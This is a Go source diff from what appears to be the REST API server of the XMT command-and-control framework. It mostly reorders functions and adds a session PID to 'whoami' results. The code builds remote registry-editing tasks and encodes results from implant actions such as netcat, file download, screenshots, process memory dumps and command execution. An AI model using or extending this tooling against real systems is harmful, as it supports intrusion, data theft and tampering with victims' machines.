@@ -31,6 +31,7 @@ import (
 
 	"github.com/PurpleSec/escape"
 	"github.com/PurpleSec/routex"
+	"github.com/iDigitalFlame/xmt/c2"
 	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/task"
 	"github.com/iDigitalFlame/xmt/c2/task/result"
@@ -326,64 +327,6 @@ func parseDuration(s string, b bool) (time.Duration, error) {
 	}
 	return d, nil
 }
-func writeJobJSON(z bool, t uint8, j *com.Packet, w io.Writer) error {
-	if err := writeJobJSONSimple(z, t, j, w); err != io.ErrClosedPipe {
-		return err
-	}
-	o := base64.NewEncoder(base64.StdEncoding, w)
-	switch w.Write([]byte(`{"type":"`)); t {
-	case task.TvPull:
-		w.Write([]byte(`pull","data":"`))
-		io.Copy(o, j)
-	case task.TvNetcat:
-		r, err := result.Netcat(j)
-		if err != nil {
-			return err
-		}
-		w.Write([]byte(`netcat","data":"`))
-		io.Copy(o, r)
-	case task.TvDownload:
-		p, d, n, r, err := result.Download(j)
-		if err != nil {
-			return err
-		}
-		w.Write([]byte(
-			`download","path":` + escape.JSON(p) +
-				`,"size":` + util.Uitoa(n) +
-				`,"dir":` + strconv.FormatBool(d) + `,"data":"`,
-		))
-		io.Copy(o, r)
-	case task.TvScreenShot, task.TvProcDump:
-		r, err := result.ProcessDump(j)
-		if err != nil {
-			return err
-		}
-		if t == task.TvProcDump {
-			w.Write([]byte(`dump",`))
-		} else {
-			w.Write([]byte(`shot",`))
-		}
-		w.Write([]byte(`"data":"`))
-		io.Copy(o, r)
-	case task.TvExecute, task.TvZombie, task.TvPullExecute:
-		p, c, r, err := result.Process(j)
-		if err != nil {
-			return err
-		}
-		w.Write([]byte(
-			`execute", "pid":` + util.Uitoa(uint64(p)) +
-				`,"exit":` + util.Itoa(int64(c)) + `,"data":"`),
-		)
-		io.Copy(o, r)
-	default:
-		w.Write([]byte(`unknown","data":"`))
-		io.Copy(o, j)
-	}
-	o.Close()
-	w.Write([]byte{'"', '}'})
-	o = nil
-	return nil
-}
 func ioPacket(c routex.Content, a string) (*com.Packet, string, error) {
 	switch strings.ToLower(a) {
 	case "kill":
@@ -577,7 +520,158 @@ func wtsPacket(c routex.Content, a string) (*com.Packet, string, error) {
 	}
 	return nil, "", errInvalidAction
 }
-func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
+func writeError(c int, e string, w http.ResponseWriter, _ *routex.Request) {
+	w.Header().Set("Content-Type", "application/json; charset=utf-8")
+	w.WriteHeader(c)
+	w.Write([]byte(`{"source": "xmt_rest", "code": ` + util.Uitoa(uint64(c)) + `, "error": `))
+	if len(e) > 0 {
+		w.Write([]byte(escape.JSON(e)))
+	} else {
+		w.Write([]byte(http.StatusText(c)))
+	}
+	w.Write([]byte{'}'})
+}
+func encoding(_ context.Context, w http.ResponseWriter, _ *routex.Request) bool {
+	w.Header().Set("Content-Type", "application/json; charset=utf-8")
+	return true
+}
+func registryPacket(c routex.Content, a, k, v string) (*com.Packet, string, error) {
+	switch strings.ToLower(a) {
+	case "get":
+		return task.RegGet(k, v), "regedit get " + k + ":" + v, nil
+	case "ls", "dir":
+		return task.RegLs(k), "regedit ls " + k + ":" + v, nil
+	case "del", "delete", "rm", "rem", "remove":
+		if len(v) == 0 {
+			return task.RegDeleteKey(k, c.BoolDefault("force", false)), "regedit deltree " + k, nil
+		}
+		return task.RegDelete(k, v, c.BoolDefault("force", false)), "regedit delete " + k + ":" + v, nil
+	case "set", "edit", "update":
+		switch strings.ToLower(c.StringDefault("type", "")) {
+		case "sz", "string":
+			d := c.StringDefault("data", "")
+			return task.RegSetString(k, v, d), "regedit edit " + k + ":" + v + hashSum([]byte(d)), nil
+		case "bin", "binary":
+			b, err := c.BytesEmpty("data")
+			if err != nil {
+				return nil, "", err
+			}
+			return task.RegSetBytes(k, v, b), "regedit edit " + k + ":" + v + hashSum(b), nil
+		case "uint32", "dword":
+			if i, ok := c.Uint("data"); ok == nil {
+				return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
+			}
+			var (
+				d      = c.StringDefault("data", "")
+				i, err = strconv.ParseInt(d, 0, 32)
+			)
+			if err != nil {
+				return nil, "", err
+			}
+			return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + d, nil
+		case "uint64", "qword":
+			if i, ok := c.Uint("data"); ok == nil {
+				return task.RegSetQword(k, v, i), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
+			}
+			var (
+				d      = c.StringDefault("data", "")
+				i, err = strconv.ParseInt(d, 0, 64)
+			)
+			if err != nil {
+				return nil, "", err
+			}
+			return task.RegSetQword(k, v, uint64(i)), "regedit edit " + k + ":" + v + " " + d, nil
+		case "multi", "multi_sz":
+			d := c.StringDefault("data", "")
+			return task.RegSetStringList(k, v, strings.Split(d, "\n")), "regedit edit " + k + ":" + v + " " + strings.ReplaceAll(d, "\n", "|"), nil
+		case "exp_sz", "expand_string":
+			d := c.StringDefault("data", "")
+			return task.RegSetExpandString(k, v, d), "regedit edit " + k + ":" + v + " " + d, nil
+		default:
+			return nil, "", errInvalidType
+		}
+	}
+	return nil, "", errInvalidAction
+}
+func writeJobJSON(z bool, t uint8, s *c2.Session, j *com.Packet, w io.Writer) error {
+	if err := writeJobJSONSimple(z, t, s, j, w); err != io.ErrClosedPipe {
+		return err
+	}
+	o := base64.NewEncoder(base64.StdEncoding, w)
+	switch w.Write([]byte(`{"type":"`)); t {
+	case task.TvPull:
+		w.Write([]byte(`pull","data":"`))
+		io.Copy(o, j)
+	case task.TvNetcat:
+		r, err := result.Netcat(j)
+		if err != nil {
+			return err
+		}
+		w.Write([]byte(`netcat","data":"`))
+		io.Copy(o, r)
+	case task.TvDownload:
+		p, d, n, r, err := result.Download(j)
+		if err != nil {
+			return err
+		}
+		w.Write([]byte(
+			`download","path":` + escape.JSON(p) +
+				`,"size":` + util.Uitoa(n) +
+				`,"dir":` + strconv.FormatBool(d) + `,"data":"`,
+		))
+		io.Copy(o, r)
+	case task.TvScreenShot, task.TvProcDump:
+		r, err := result.ProcessDump(j)
+		if err != nil {
+			return err
+		}
+		if t == task.TvProcDump {
+			w.Write([]byte(`dump",`))
+		} else {
+			w.Write([]byte(`shot",`))
+		}
+		w.Write([]byte(`"data":"`))
+		io.Copy(o, r)
+	case task.TvExecute, task.TvZombie, task.TvPullExecute:
+		p, c, r, err := result.Process(j)
+		if err != nil {
+			return err
+		}
+		w.Write([]byte(
+			`execute", "pid":` + util.Uitoa(uint64(p)) +
+				`,"exit":` + util.Itoa(int64(c)) + `,"data":"`),
+		)
+		io.Copy(o, r)
+	default:
+		w.Write([]byte(`unknown","data":"`))
+		io.Copy(o, j)
+	}
+	o.Close()
+	w.Write([]byte{'"', '}'})
+	o = nil
+	return nil
+}
+func (c *Cirrus) auth(_ context.Context, w http.ResponseWriter, r *routex.Request) bool {
+	if len(c.Auth) == 0 {
+		return true
+	}
+	if !strings.EqualFold(r.Header.Get("X-CirrusAuth"), c.Auth) {
+		w.WriteHeader(http.StatusUnauthorized)
+		c.log.Info(`[cirrus/http] Received invalid auth token from: %s!`, r.RemoteAddr)
+		return false
+	}
+	return true
+}
+func (c *Cirrus) websocket(_ context.Context, w http.ResponseWriter, r *routex.Request) {
+	s, err := c.ws.Upgrade(w, r.Request, nil)
+	if err != nil {
+		writeError(http.StatusInternalServerError, err.Error(), w, r)
+		return
+	}
+	c.log.Trace(`[cirrus/http] Received websocket request from: %s!`, r.RemoteAddr)
+	c.events.subscribe(s)
+}
+func writeJobJSONSimple(z bool, t uint8, s *c2.Session, j *com.Packet, w io.Writer) error {
 	switch t {
 	case task.MvCwd:
 		w.Write([]byte(`{"type":"cd"}`))
@@ -642,7 +736,7 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 				w.Write([]byte(`{"type":"empty"}`))
 				continue
 			}
-			if err := writeJobJSON(true, v[i].ID, v[i], w); err != nil && err != io.ErrClosedPipe {
+			if err := writeJobJSON(true, v[i].ID, s, v[i], w); err != nil && err != io.ErrClosedPipe {
 				return err
 			}
 		}
@@ -666,7 +760,11 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 		if err != nil {
 			return err
 		}
-		w.Write([]byte(`{"type":"whoami","user":` + escape.JSON(u) + `, "path":` + escape.JSON(p) + `}`))
+		// NOTE(dij): Until we update the 'MvWhoami' task to return the current
+		//            PID, we can use this "hack" to return it as it should never
+		//            be different from the Session base details.
+		// TODO(dij): ^
+		w.Write([]byte(`{"type":"whoami","user":` + escape.JSON(u) + `, "path":` + escape.JSON(p) + `,"pid":` + util.Uitoa(uint64(s.Device.PID)) + `}`))
 	case task.MvRefresh:
 		w.Write([]byte(`{"type":"refresh"}`))
 	case task.MvMigrate:
@@ -887,97 +985,4 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 		return io.ErrClosedPipe
 	}
 	return nil
-}
-func writeError(c int, e string, w http.ResponseWriter, _ *routex.Request) {
-	w.Header().Set("Content-Type", "application/json; charset=utf-8")
-	w.WriteHeader(c)
-	w.Write([]byte(`{"source": "xmt_rest", "code": ` + util.Uitoa(uint64(c)) + `, "error": `))
-	if len(e) > 0 {
-		w.Write([]byte(escape.JSON(e)))
-	} else {
-		w.Write([]byte(http.StatusText(c)))
-	}
-	w.Write([]byte{'}'})
-}
-func encoding(_ context.Context, w http.ResponseWriter, _ *routex.Request) bool {
-	w.Header().Set("Content-Type", "application/json; charset=utf-8")
-	return true
-}
-func registryPacket(c routex.Content, a, k, v string) (*com.Packet, string, error) {
-	switch strings.ToLower(a) {
-	case "get":
-		return task.RegGet(k, v), "regedit get " + k + ":" + v, nil
-	case "ls", "dir":
-		return task.RegLs(k), "regedit ls " + k + ":" + v, nil
-	case "del", "delete", "rm", "rem", "remove":
-		if len(v) == 0 {
-			return task.RegDeleteKey(k, c.BoolDefault("force", false)), "regedit deltree " + k, nil
-		}
-		return task.RegDelete(k, v, c.BoolDefault("force", false)), "regedit delete " + k + ":" + v, nil
-	case "set", "edit", "update":
-		switch strings.ToLower(c.StringDefault("type", "")) {
-		case "sz", "string":
-			d := c.StringDefault("data", "")
-			return task.RegSetString(k, v, d), "regedit edit " + k + ":" + v + hashSum([]byte(d)), nil
-		case "bin", "binary":
-			b, err := c.BytesEmpty("data")
-			if err != nil {
-				return nil, "", err
-			}
-			return task.RegSetBytes(k, v, b), "regedit edit " + k + ":" + v + hashSum(b), nil
-		case "uint32", "dword":
-			if i, ok := c.Uint("data"); ok == nil {
-				return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
-			}
-			var (
-				d      = c.StringDefault("data", "")
-				i, err = strconv.ParseInt(d, 0, 32)
-			)
-			if err != nil {
-				return nil, "", err
-			}
-			return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + d, nil
-		case "uint64", "qword":
-			if i, ok := c.Uint("data"); ok == nil {
-				return task.RegSetQword(k, v, i), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
-			}
-			var (
-				d      = c.StringDefault("data", "")
-				i, err = strconv.ParseInt(d, 0, 64)
-			)
-			if err != nil {
-				return nil, "", err
-			}
-			return task.RegSetQword(k, v, uint64(i)), "regedit edit " + k + ":" + v + " " + d, nil
-		case "multi", "multi_sz":
-			d := c.StringDefault("data", "")
-			return task.RegSetStringList(k, v, strings.Split(d, "\n")), "regedit edit " + k + ":" + v + " " + strings.ReplaceAll(d, "\n", "|"), nil
-		case "exp_sz", "expand_string":
-			d := c.StringDefault("data", "")
-			return task.RegSetExpandString(k, v, d), "regedit edit " + k + ":" + v + " " + d, nil
-		default:
-			return nil, "", errInvalidType
-		}
-	}
-	return nil, "", errInvalidAction
-}
-func (c *Cirrus) auth(_ context.Context, w http.ResponseWriter, r *routex.Request) bool {
-	if len(c.Auth) == 0 {
-		return true
-	}
-	if !strings.EqualFold(r.Header.Get("X-CirrusAuth"), c.Auth) {
-		w.WriteHeader(http.StatusUnauthorized)
-		c.log.Info(`[cirrus/http] Received invalid auth token from: %s!`, r.RemoteAddr)
-		return false
-	}
-	return true
-}
-func (c *Cirrus) websocket(_ context.Context, w http.ResponseWriter, r *routex.Request) {
-	s, err := c.ws.Upgrade(w, r.Request, nil)
-	if err != nil {
-		writeError(http.StatusInternalServerError, err.Error(), w, r)
-		return
-	}
-	c.log.Trace(`[cirrus/http] Received websocket request from: %s!`, r.RemoteAddr)
-	c.events.subscribe(s)
 }
